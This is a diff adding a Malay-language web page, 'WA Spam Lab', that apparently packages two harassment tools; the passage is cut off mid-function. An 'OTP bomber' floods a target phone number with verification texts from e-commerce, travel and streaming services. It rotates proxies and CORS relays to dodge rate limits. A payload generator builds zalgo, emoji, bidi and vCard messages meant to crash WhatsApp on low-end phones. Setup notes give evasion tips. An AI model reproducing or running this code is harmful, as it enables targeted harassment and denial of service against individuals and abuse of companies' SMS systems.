@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>WA Spam Lab</title>
+<style>
+  :root{
+    --bg:#0d0f12; --card:#15181d; --input:#1c2027; --line:#2a2f38;
+    --fg:#e9edf3; --muted:#8b93a1; --primary:#2f7dff; --ok:#2fbf71; --bad:#ef5350; --warn:#e0a33a;
+  }
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  body{margin:0;background:var(--bg);color:var(--fg);font:14px/1.5 -apple-system,Roboto,system-ui,sans-serif;
+       padding:16px 14px calc(24px + env(safe-area-inset-bottom))}
+  h1{font-size:19px;margin:0 0 4px;font-weight:600}
+  .sub{color:var(--muted);font-size:12.5px;margin:0 0 14px}
+  .tabs{display:flex;gap:6px;border-bottom:1px solid var(--line);margin-bottom:14px;overflow-x:auto}
+  .tab{background:none;border:0;border-bottom:2px solid transparent;color:var(--muted);
+       padding:9px 8px;font-size:13px;white-space:nowrap}
+  .tab.on{color:var(--fg);border-bottom-color:var(--primary);font-weight:600}
+  .panel{display:none}.panel.on{display:block}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:12px;margin-bottom:12px}
+  .card h2{font-size:14px;margin:0 0 8px;font-weight:600}
+  .lbl{display:block;font-size:12px;color:var(--muted);margin-bottom:6px}
+  .lblrow{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;gap:8px;flex-wrap:wrap}
+  .lblrow h2,.lblrow .lbl{margin:0}
+  .linkbtn{background:none;border:0;color:var(--primary);font-size:12px;padding:0}
+  .row{display:flex;gap:8px;align-items:center}
+  input,select,textarea{background:var(--input);color:var(--fg);border:1px solid var(--line);
+    border-radius:9px;padding:10px;font-size:14px;width:100%;font-family:inherit}
+  input:focus,select:focus,textarea:focus{outline:none;border-color:var(--primary)}
+  .cc{width:100px;flex:0 0 100px}
+  .grow{flex:1;min-width:0}
+  .mt{margin-top:10px}
+  .mono{font-family:ui-monospace,Menlo,monospace;font-size:11.5px}
+  .grid{display:grid;grid-template-columns:1fr 1fr;gap:6px}
+  .opt{display:flex;align-items:center;gap:7px;border:1px solid var(--line);border-radius:9px;
+       padding:9px 8px;font-size:12.5px}
+  .opt input{width:auto;padding:0;margin:0;accent-color:var(--primary)}
+  .opt .nm{flex:1}
+  .bdg{font-size:10px;padding:1px 5px;border-radius:4px;border:1px solid var(--line);color:var(--muted)}
+  .bh{color:var(--ok);border-color:var(--ok)}.bm{color:var(--warn);border-color:var(--warn)}
+  .bl{color:var(--bad);border-color:var(--bad)}
+  .hint{font-size:11px;color:var(--muted);margin-top:7px}
+  .acts{display:flex;gap:8px;flex-wrap:wrap;margin:12px 0}
+  button.p,button.s{border-radius:9px;padding:11px 14px;font-size:13.5px;border:1px solid transparent;font-family:inherit}
+  button.p{background:var(--primary);color:#fff;font-weight:600}
+  button.s{background:var(--input);color:var(--fg);border-color:var(--line)}
+  button:disabled{opacity:.45}
+  .cnt{font-size:12px;color:var(--muted);margin-left:auto}
+  .log{border:1px solid var(--line);border-radius:9px;padding:8px;height:180px;overflow-y:auto;
+       background:#0a0c0f;font-family:ui-monospace,Menlo,monospace;font-size:11.5px}
+  .ln{white-space:pre-wrap;word-break:break-word;padding:1px 0}
+  .ok{color:var(--ok)}.bad{color:var(--bad)}.warn{color:var(--warn)}.mut{color:var(--muted)}
+  .ph{display:flex;justify-content:space-between;align-items:baseline;margin-bottom:6px}
+  .prev{border:1px solid var(--line);border-radius:9px;padding:8px;height:140px;overflow-y:auto;
+        background:#0a0c0f;white-space:pre-wrap;word-break:break-all;margin-bottom:12px}
+  ul{margin:0;padding-left:18px}li{margin-bottom:5px}
+  code{background:var(--input);padding:1px 4px;border-radius:4px;font-size:11.5px}
+  pre{background:#0a0c0f;border:1px solid var(--line);border-radius:9px;padding:10px;
+      overflow:auto;max-height:340px;font-size:11px;white-space:pre}
+  .note{background:#1a1d22;border-left:3px solid var(--primary);padding:9px 11px;border-radius:0 8px 8px 0;
+        font-size:12px;color:var(--muted);margin-bottom:12px}
+</style>
+</head>
+<body>
+
+<h1>WA Spam Lab</h1>
+<p class="sub">OTP bomber + payload crash WhatsApp. Lalai Malaysia (+60).</p>
+
+<div class="note">Mod APK: permintaan dihantar melalui HTTP asli Android, jadi tiada had CORS. Laluan proxy hanya untuk elak had IP.</div>
+
+<div class="tabs">
+  <button class="tab on" data-t="otp">1. OTP bomber</button>
+  <button class="tab" data-t="crash">2. WhatsApp crash</button>
+  <button class="tab" data-t="setup">Keperluan</button>
+</div>
+
+<section class="panel on" id="p-otp">
+  <div class="card">
+    <label class="lbl">Nombor WhatsApp sasaran</label>
+    <div class="row">
+      <select id="cc" class="cc"></select>
+      <input id="num" class="grow" type="tel" inputmode="numeric" placeholder="123456789">
+    </div>
+    <div class="hint">Tanpa 0 depan. 012-345 6789 jadi +60123456789.</div>
+  </div>
+
+  <div class="card">
+    <div class="lblrow">
+      <label class="lbl">Platform OTP</label>
+      <span><button class="linkbtn" data-all="1">Semua</button> · <button class="linkbtn" data-all="0">Kosong</button></span>
+    </div>
+    <div class="grid" id="plats"></div>
+    <div class="hint">Endpoint ikut negara dipilih. Bertanda (ID) hanya untuk nombor Indonesia.</div>
+  </div>
+
+  <div class="card">
+    <div class="grid">
+      <div><label class="lbl">Pusingan</label><input id="rounds" type="number" min="1" max="50" value="3"></div>
+      <div><label class="lbl">Jeda (saat)</label>
+        <div class="row"><input id="dmin" type="number" min="1" value="4"><input id="dmax" type="number" min="2" value="9"></div>
+      </div>
+    </div>
+    <label class="lbl mt">Laluan</label>
+    <select id="mode">
+      <option value="direct">Asli (APK) — disyorkan</option>
+      <option value="auto">Auto dengan CORS proxy</option>
+      <option value="allorigins">allorigins</option>
+      <option value="corsproxy">corsproxy.io</option>
+      <option value="custom">Proxy sendiri</option>
+    </select>
+    <label class="lbl mt">Endpoint sendiri (pilihan)</label>
+    <input id="customUrl" type="url" placeholder="https://... ({phone} = E.164)">
+    <label class="lbl mt">Senarai proxy (satu per baris)</label>
+    <textarea id="proxies" class="mono" rows="3" placeholder="http://user:pass@host:port"></textarea>
+  </div>
+
+  <div class="acts">
+    <button id="start" class="p">Mula spam</button>
+    <button id="stop" class="s" disabled>Henti</button>
+    <span class="cnt" id="stats">0 OK / 0 gagal</span>
+  </div>
+  <div class="log" id="log"><div class="ln mut">Sedia.</div></div>
+</section>
+
+<section class="panel" id="p-crash">
+  <div class="card">
+    <label class="lbl">Nombor WhatsApp sasaran</label>
+    <div class="row">
+      <select id="cc2" class="cc"></select>
+      <input id="num2" class="grow" type="tel" inputmode="numeric" placeholder="123456789">
+    </div>
+  </div>
+
+  <div class="card">
+    <label class="lbl">Jenis payload</label>
+    <div class="grid" id="pays"></div>
+    <div class="hint">Had WhatsApp 65 536 aksara. Zalgo dan vCard paling berat.</div>
+  </div>
+
+  <div class="card">
+    <div class="grid">
+      <div><label class="lbl">Intensiti</label>
+        <select id="power">
+          <option value="0.35">Ringan</option>
+          <option value="0.7" selected>Sederhana</option>
+          <option value="1">Nuklir</option>
+        </select>
+      </div>
+      <div><label class="lbl">Mesej (burst)</label><input id="burst" type="number" min="1" max="30" value="5"></div>
+    </div>
+    <div class="acts">
+      <button id="gen" class="p">Jana</button>
+      <button id="copy" class="s">Salin</button>
+      <button id="openwa" class="s">Buka chat</button>
+      <button id="vcf" class="s">Simpan .vcf</button>
+      <button id="sendburst" class="s">Hantar berulang</button>
+    </div>
+  </div>
+
+  <div class="ph"><span class="lbl">Pratonton</span><span class="cnt" id="charc">0 aksara</span></div>
+  <div class="prev mono" id="prev">Belum ada payload.</div>
+  <div class="log" id="log2"><div class="ln mut">Log di sini.</div></div>
+</section>
+
+<section class="panel" id="p-setup">
+  <div class="card">
+    <h2>Keperluan OTP bomber</h2>
+    <ul>
+      <li>Nombor E.164, negara mesti padan dengan domain platform.</li>
+      <li>APK tak perlu CORS proxy. Proxy residensial Malaysia hanya untuk elak 429.</li>
+      <li>User-Agent mobile wajib — dari APK sudah betul, dari desktop banyak gagal.</li>
+      <li>Jeda 4–9 saat; OTP kedua dalam 60 saat biasanya diabaikan.</li>
+      <li>Tiada API key. Platform bertanda rendah perlukan token — guna backend Node.</li>
+    </ul>
+  </div>
+  <div class="card">
+    <h2>Keperluan WhatsApp crash</h2>
+    <ul>
+      <li>Kos render, bukan saiz. Zalgo, emoji ZWJ dan bidi paling berat.</li>
+      <li>vCard bomb: ribuan baris TEL dalam satu kad.</li>
+      <li>Berkesan pada Android RAM rendah; flagship cuma lewat 2–5 saat.</li>
+      <li>Automasi penuh: Baileys (Node). Had WhatsApp ~15–20 mesej/minit.</li>
+    </ul>
+  </div>
+  <div class="card">
+    <h2>Nota</h2>
+    <ul>
+      <li>Platform tukar skema tanpa notis. Kalau satu gagal berulang, tambah header di backend.</li>
+      <li>TNG eWallet, AirAsia, Booking perlukan signature — backend sahaja.</li>
+    </ul>
+  </div>
+</section>
+
+<script>
+(function(){
+  var $=function(i){return document.getElementById(i)};
+  var sleep=function(ms){return new Promise(function(r){setTimeout(r,ms)})};
+  var rnd=function(a,b){return a+Math.random()*(b-a)};
+
+  var CC=[["60","MY +60"],["65","SG +65"],["62","ID +62"],["66","TH +66"],["63","PH +63"],["673","BN +673"],["91","IN +91"],["966","SA +966"],["971","AE +971"],["44","UK +44"],["1","US +1"],["61","AU +61"]];
+  function fillCC(s){CC.forEach(function(c){var o=document.createElement("option");o.value=c[0];o.textContent=c[1];s.appendChild(o)});s.value="60"}
+  fillCC($("cc"));fillCC($("cc2"));
+
+  var REG={"62":{s:"shopee.co.id",l:"member.lazada.co.id",f:"foodpanda.co.id",z:"zalora.co.id",g:"ID",loc:"id_ID"},
+           "60":{s:"shopee.com.my",l:"member.lazada.com.my",f:"foodpanda.com.my",z:"zalora.com.my",g:"MY",loc:"ms_MY"},
+           "65":{s:"shopee.sg",l:"member.lazada.sg",f:"foodpanda.sg",z:"zalora.sg",g:"SG",loc:"en_SG"},
+           "63":{s:"shopee.ph",l:"member.lazada.com.ph",f:"foodpanda.ph",z:"zalora.com.ph",g:"PH",loc:"en_PH"},
+           "66":{s:"shopee.co.th",l:"member.lazada.co.th",f:"foodpanda.co.th",z:"zalora.co.th",g:"TH",loc:"th_TH"}};
+  function R(c){return REG[c]||REG["60"]}
+
+  var P=[
+    {id:"shopee",n:"Shopee",r:"h",u:function(p){return "https://"+R(p.cc).s+"/api/v2/otp/send_otp"},
+     h:function(p){return{"content-type":"application/json","x-api-source":"pc","referer":"https://"+R(p.cc).s+"/"}},
+     b:function(p){return{phone:p.digits,otp_type:0}}},
+    {id:"agoda",n:"Agoda",r:"h",u:function(){return "https://www.agoda.com/api/cronos/identity/v2/otp/send"},
+     h:function(){return{"content-type":"application/json","referer":"https://www.agoda.com/"}},
+     b:function(p){return{otpType:"SMS",phoneNumber:{countryCode:"+"+p.cc,number:p.nat}}}},
+    {id:"grab",n:"Grab",r:"h",u:function(){return "https://api.grab.com/grabid/v1/phone/otp"},
+     h:function(){return{"content-type":"application/json","x-grab-web-app-version":"2.200.0","referer":"https://grab.com/"}},
+     b:function(p){return{phoneNumber:"+"+p.digits,method:"SMS",countryCode:R(p.cc).g,otpType:"phone_verification"}}},
+    {id:"foodpanda",n:"Foodpanda",r:"m",u:function(p){return "https://www."+R(p.cc).f+"/api/v1/customers/otp"},
+     h:function(p){return{"content-type":"application/json","referer":"https://www."+R(p.cc).f+"/"}},
+     b:function(p){return{phone:"+"+p.digits,locale:R(p.cc).loc}}},
+    {id:"lazada",n:"Lazada",r:"m",u:function(p){return "https://"+R(p.cc).l+"/user/api/sendOtpCode"},
+     h:function(p){return{"content-type":"application/json","referer":"https://"+R(p.cc).l+"/"}},
+     b:function(p){return{phone:p.digits}}},
+    {id:"zalora",n:"Zalora",r:"m",u:function(p){return "https://www."+R(p.cc).z+"/customer/ajax/sendOtp"},
+     h:function(p){return{"content-type":"application/json","referer":"https://www."+R(p.cc).z+"/"}},
+     b:function(p){return{phone:"+"+p.digits}}},
+    {id:"traveloka",n:"Traveloka",r:"m",u:function(){return "https://www.traveloka.com/api/v2/otp/send"},
+     h:function(){return{"content-type":"application/json","referer":"https://www.traveloka.com/"}},
+     b:function(p){return{phoneNumber:"+"+p.digits,type:"SMS"}}},
+    {id:"tiktok",n:"TikTok",r:"l",u:function(){return "https://www.tiktok.com/api/v2/user/otp/send"},
+     h:function(){return{"content-type":"application/json","referer":"https://www.tiktok.com/"}},
+     b:function(p){return{mobile:"+"+p.digits,type:"sms"}}},
+    {id:"netflix",n:"Netflix",r:"l",u:function(){return "https://www.netflix.com/api/shakti/mre/otp/send"},
+     h:function(){return{"content-type":"application/json","referer":"https://www.netflix.com/"}},
+     b:function(p){return{phoneNumber:"+"+p.digits}}},
+    {id:"tokopedia",n:"Tokopedia (ID)",r:"m",u:function(){return "https://accounts.tokopedia.com/api/v1/otp/request"},
+     h:function(){return{"content-type":"application/json","referer":"https://www.tokopedia.com/"}},
+     b:function(p){return{phone:"+"+p.digits,type:"SMS"}}},
+    {id:"bukalapak",n:"Bukalapak (ID)",r:"m",u:function(){return "https://accounts.bukalapak.com/v3/otp/send"},
+     h:function(){return{"content-type":"application/json","referer":"https://www.bukalapak.com/"}},
+     b:function(p){return{phone:"+"+p.digits}}}
+  ];
+
+  P.forEach(function(x){
+    var l=document.createElement("label");l.className="opt";
+    var c=document.createElement("input");c.type="checkbox";c.className="pl";c.value=x.id;c.checked=x.r==="h";
+    var n=document.createElement("span");n.className="nm";n.textContent=x.n;
+    var b=document.createElement("span");b.className="bdg "+(x.r==="h"?"bh":x.r==="m"?"bm":"bl");
+    b.textContent=x.r==="h"?"tinggi":x.r==="m"?"sederhana":"rendah";
+    l.appendChild(c);l.appendChild(n);l.appendChild(b);$("plats").appendChild(l);
+  });
+  document.querySelectorAll("[data-all]").forEach(function(b){
+    b.onclick=function(){var on=b.dataset.all==="1";
+      document.querySelectorAll(".pl").forEach(function(c){c.checked=on})};
+  });
+
+  var PY=[["long","Teks panjang",1],["zalgo","Zalgo",1],["emoji","Emoji ZWJ",0],["newline","Baris baru",0],["bidi","Kawalan bidi",0],["vcf","vCard bomb",0]];
+  PY.forEach(function(x){
+    var l=document.createElement("label");l.className="opt";
+    var c=document.createElement("input");c.type="checkbox";c.className="py";c.value=x[0];c.checked=!!x[2];
+    var n=document.createElement("span");n.className="nm";n.textContent=x[1];
+    l.appendChild(c);l.appendChild(n);$("pays").appendChild(l);
+  });
+
+  document.querySelectorAll(".tab").forEach(function(t){
+    t.onclick=function(){
+      document.querySelectorAll(".tab").forEach(function(x){x.classList.remove("on")});
+      document.querySelectorAll(".panel").forEach(function(x){x.classList.remove("on")});
+      t.classList.add("on");$("p-"+t.dataset.t).classList.add("on");
+    };
+  });
+
+  function log(box,msg,cls){
+    var d=document.createElement("div");d.className="ln "+(cls||"");
+    d.textContent="["+new Date().toTimeString().slice(0,8)+"] "+msg;
+    box.appendChild(d);while(box.childNodes.length>300)box.removeChild(box.firstChild);
+    box.scrollTop=box.scrollHeight;
+  }
+  function ph(a,b){
+    var nat=a.value.replace(/\D/g,"").replace(/^0+/,"");
+    if(nat.length<6)return null;
+    return{cc:b.value,nat:nat,digits:b.value+nat,plus:"+"+b.value+nat};
+  }
+  function open(url){window.open(url,"_system")}
+
+  var CORS={allorigins:function(u){return "https://api.allorigins.win/raw?url="+encodeURIComponent(u)},
+            corsproxy:function(u){return "https://corsproxy.io/?url="+encodeURIComponent(u)}};
+
+  async function hit(url,meth,head,body,wrap){
+    var c=new AbortController(),t=setTimeout(function(){c.abort()},15000);
+    try{
+      var r=await fetch(wrap?wrap(url):url,{method:meth,headers:head,body:body,signal:c.signal});
+      var x="";try{x=(await r.text()).slice(0,300)}catch(e){}
+      return{st:r.status,ok:r.ok,tx:x};
+    }catch(e){return{st:0,ok:false,tx:String(e.message),net:true}}
+    finally{clearTimeout(t)}
+  }
+
+  var run=false,okc=0,failc=0;
+  function st(){$("stats").textContent=okc+" OK / "+failc+" gagal"}
+  $("stop").onclick=function(){run=false;log($("log"),"Dihentikan.","warn")};
+
+  $("start").onclick=async function(){
+    if(run)return;
+    var p=ph($("num"),$("cc")),box=$("log");
+    if(!p){log(box,"Nombor tidak sah.","bad");return}
+    var ids=[].slice.call(document.querySelectorAll(".pl:checked")).map(function(c){return c.value});
+    var cu=$("customUrl").value.trim();
+    if(!ids.length&&!cu){log(box,"Pilih platform.","bad");return}
+
+    var rd=Math.min(50,Math.max(1,parseInt($("rounds").value)||1));
+    var mn=Math.max(1,parseInt($("dmin").value)||4)*1000;
+    var mx=Math.max(mn,(parseInt($("dmax").value)||9)*1000);
+    var mode=$("mode").value;
+    var px=$("proxies").value.split("\n").map(function(s){return s.trim()}).filter(Boolean);
+
+    run=true;okc=0;failc=0;st();$("start").disabled=true;$("stop").disabled=false;
+    log(box,"Sasaran "+p.plus+" | "+ids.length+" platform | "+rd+" pusingan",  "warn");
+
+    for(var r=0;r<rd&&run;r++){
+      var list=ids.slice().sort(function(){return Math.random()-.5});
+      if(cu)list.push("__c");
+      for(var i=0;i<list.length&&run;i++){
+        var id=list[i],nm,url,head,body;
+        if(id==="__c"){
+          nm="Custom";url=cu.replace("{phone}",encodeURIComponent(p.plus));
+          head={"content-type":"application/json"};body=JSON.stringify({phone:p.plus});
+        }else{
+          var d=P.find(function(x){return x.id===id});
+          nm=d.n;url=d.u(p);head=d.h(p);body=JSON.stringify(d.b(p));
+        }
+        var wraps;
+        if(mode==="auto")wraps=[null].concat(Object.keys(CORS).map(function(k){return CORS[k]}));
+        else if(mode==="custom")wraps=px.length?px.map(function(x){return function(u){return x+encodeURIComponent(u)}}):[null];
+        else if(mode==="direct")wraps=[null];
+        else wraps=[CORS[mode]];
+
+        var res=null;
+        for(var w=0;w<wraps.length;w++){
+          res=await hit(url,"POST",head,body,wraps[w]);
+          if(!res.net)break;
+        }
+        if(res.st===0){failc++;log(box,"GAGAL "+nm+" — "+res.tx.slice(0,70),"bad")}
+        else if(res.ok&&!/"(error|fail|invalid)/i.test(res.tx)){okc++;log(box,"OK   "+nm+" — "+res.st,"ok")}
+        else if(res.st===429){failc++;log(box,"429  "+nm+" — had kadar","warn")}
+        else{failc++;log(box,"TOLAK "+nm+" — "+res.st+" "+res.tx.slice(0,60),"bad")}
+        st();
+        await sleep(rnd(mn,mx));
+      }
+      if(r<rd-1&&run){log(box,"— pusingan "+(r+2)+" —","mut");await sleep(2500)}
+    }
+    run=false;$("start").disabled=false;$("stop").disabled=true;
+    log(box,"Selesai: "+okc+" berjaya, "+failc+" gagal.",okc?"ok":"warn");
+  };
+
+  var MK=["\u0300","\u0301","\u0302","\u0303","\u0304","\u0305","\u0306","\u0307","\u0308","\u0309","\u030A","\u030B","\u030C","\u030D","\u030E","\u030F","\u0310","\u0311","\u0312","\u0313","\u0314","\u0315","\u033D","\u033E","\u033F","\u0346"];
+  var W=["kredit","pengguna","mesej","sistem","modul","rangkaian","peranti","pemproses","ingatan","paparan","lapisan","kandungan","struktur","isyarat"];
+  var E=["\u{1F468}\u200D\u{1F469}\u200D\u{1F467}\u200D\u{1F466}","\u{1F469}\u{1F3FD}\u200D\u{1F4BB}","\u{1F468}\u{1F3FF}\u200D\u{1F680}","\u{1F9D1}\u{1F3FE}\u200D\u{1F9BD}","\u{1F3F4}\u{E0067}\u{E0062}\u{E0073}\u{E0063}\u{E0074}\u{E007F}"];
+  function gl(n){var o=[];while(o.join(" ").length<n){var s=[];for(var i=0;i<Math.floor(rnd(4,10));i++)s.push(W[Math.floor(Math.random()*W.length)]);o.push(s.join(" "))}return o.join(" ").slice(0,n)}
+  function gz(n,dp){var b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",o=[],l=0;
+    while(l<n){var m="";for(var i
